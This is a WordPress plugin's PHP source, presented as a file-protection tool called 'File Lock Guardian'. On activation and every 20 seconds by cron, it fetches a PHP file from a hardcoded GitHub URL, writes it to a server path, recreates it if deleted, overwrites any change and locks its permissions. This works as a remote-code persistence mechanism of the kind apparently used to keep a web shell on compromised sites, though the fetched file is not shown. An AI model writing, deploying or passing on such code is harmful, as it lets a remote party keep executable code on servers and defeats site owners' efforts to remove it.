<?php
/*
Plugin Name: File Lock Guardian (GitHub)
Description: Protects and locks a PHP file by restoring content and permissions if modified, deleted, or unwritable.
Version: 1.3
Author: Khayrol Islam
Telegram: @DevidLuice 
*/

register_activation_hook(__FILE__, 'flg_activate');
register_deactivation_hook(__FILE__, 'flg_deactivate');

//Change your File Path
define('FLG_PROTECTED_FILE', '/home/user/hello.php');
define('FLG_HASH_FILE', '/home/user/hello.hash');
//Change your url 
define('FLG_REMOTE_FILE_URL', 'https://raw.githubusercontent.com/mrTr1cky/CronJobControl/refs/heads/main/hello.php');

// GitHub content fetch
function flg_fetch_remote_content() {
    $content = file_get_contents(FLG_REMOTE_FILE_URL);
    return $content !== false && !empty($content) ? $content : null;
}

// Set permission to writable (644), lock (444), or fallback
function flg_set_permission($file, $mode) {
    if (file_exists($file)) {
        @chmod($file, $mode);
    }
}

// Main checker
function flg_check_file() {
    $file = FLG_PROTECTED_FILE;
    $hash_file = FLG_HASH_FILE;

    // Restore missing file
    if (!file_exists($file)) {
        $content = flg_fetch_remote_content();
        if ($content !== null) {
            file_put_contents($file, $content);
            flg_set_permission($file, 0444);
            file_put_contents($hash_file, md5($content));
        }
        return;
    }

    // Unlock if not writable
    if (!is_writable($file)) {
        flg_set_permission($file, 0644);
    }

    $current_hash = md5_file($file);
    $stored_hash = @file_get_contents($hash_file);

    // If content changed
    if ($current_hash !== $stored_hash) {
        $content = flg_fetch_remote_content();
        if ($content !== null) {
            file_put_contents($file, $content);
            file_put_contents($hash_file, md5($content));
        }
    }

    // Lock again
    flg_set_permission($file, 0444);
}

// Schedule
function flg_activate() {
    if (!file_exists(FLG_PROTECTED_FILE)) {
        $content = flg_fetch_remote_content();
        if ($content !== null) {
            file_put_contents(FLG_PROTECTED_FILE, $content);
        }
    }

    file_put_contents(FLG_HASH_FILE, md5_file(FLG_PROTECTED_FILE));
    flg_set_permission(FLG_PROTECTED_FILE, 0444); // Lock file

    if (!wp_next_scheduled('flg_cron_hook')) {
        wp_schedule_event(time(), 'twenty_seconds', 'flg_cron_hook');
    }
}

function flg_deactivate() {
    wp_clear_scheduled_hook('flg_cron_hook');
}

// Cron check run
add_action('flg_cron_hook', 'flg_check_file');

// 20s interval add
add_filter('cron_schedules', function($schedules) {
    $schedules['twenty_seconds'] = [
        'interval' => 20,
        'display'  => __('Every 20 Seconds')
    ];
    return $schedules;
});
